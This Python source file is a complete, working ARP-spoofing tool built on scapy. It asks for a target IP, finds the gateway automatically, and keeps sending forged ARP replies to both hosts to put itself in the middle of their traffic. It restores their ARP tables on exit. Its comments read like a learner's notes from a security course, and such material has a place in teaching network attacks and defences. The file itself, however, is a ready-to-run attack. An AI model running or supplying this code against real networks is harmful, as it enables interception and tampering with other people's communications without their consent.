#!usr/bin/env python

import scapy.all as scapy
import time
# import sys
import subprocess
import re


# get_mac() method is used to get the mac address for target_ip, so that user doesn't hav to enter mac addr everytime.
# it is taken from network Scanner program
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_frame_append_arp_request = broadcast_frame/arp_request
    answered_list = scapy.srp(broadcast_frame_append_arp_request, timeout=1, verbose=False)[0]
    element=answered_list[0]            #doubt
    return element[1].hwsrc             #we only require the MAC address


# method to get the Gateway IP address automatically
def get_gateway_ip():
    attr = "-a"
    # subprocess.call(["arp", attr])
    output = subprocess.check_output(["arp", attr])
    # print(output)
    gateway_extraction_output = re.search(r"\d\d?\d?\.\d\d?\d?\.\d\d?\d?\.\d\d?\d?", output.decode())
    return gateway_extraction_output.group(0)


# Method to restore the ARP tables of victim and Router after arp_spoofing is completed by user
def restore(dest_ip, src_ip):
    dest_mac =get_mac(dest_ip)
    src_mac =get_mac(src_ip)
    packet =scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)       # "op=2" makes it a response packet
    scapy.send(packet, count=4, verbose=False)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst= target_ip, hwdst=target_mac, psrc=spoof_ip)   #creating the ARP response packet
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)  #sending the packet


Target_ip = input("Target IP: ")
gateway_ip = get_gateway_ip()

packets_count = 0
# to stop the mac address of router in victim's ARP-TABLE & vice-versa, we need to send the packets continously
# Using Exception-Handling concept
try:
    while True:
        spoof(Target_ip, gateway_ip)          # packet sent to victim
        spoof(gateway_ip, Target_ip)         # packet sent to Router
        packets_count +=2
        #print("\r[*] Packets sent : "+str(packets_count)),
        # comma(,) in the end sends all the print statements to System buffer instead of displaying it on STDOUT
        #sys.stdout.flush()      # to flush the buffer into STDOUT      // only compatible till python 2.7
        # compatible with python 3+
        print("\r[*] Packets sent : " + str(packets_count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("[*] detected ctrl+C ...  Resetting ARP tables of victim and Router...")
    restore(Target_ip, gateway_ip)
    restore(gateway_ip, Target_ip)
